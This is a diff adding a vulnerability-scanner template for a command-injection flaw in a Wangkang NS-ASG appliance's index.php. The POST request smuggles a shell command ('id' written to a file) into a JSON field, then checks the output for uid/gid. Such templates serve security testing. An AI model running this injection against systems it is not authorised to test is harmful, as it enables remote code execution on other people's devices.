@@ -1,0 +1,48 @@
+
+id: wangkang-NS-ASG-index-rce
+
+info:
+  name: wangkang-NS-ASG-index.php-rce
+  severity: critical
+  tags: wangkang
+  author: xxx
+
+requests:
+  - raw:
+      - |              
+        POST /protocol/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Ua-Cpu: AMD64
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 76
+
+        jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>{{randstr}}.txt;"}
+        
+      - |              
+        GET /protocol/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Ua-Cpu: AMD64
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        
+    matchers-condition: and               
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+        
+      - type: status
+        status:
+          - 200        
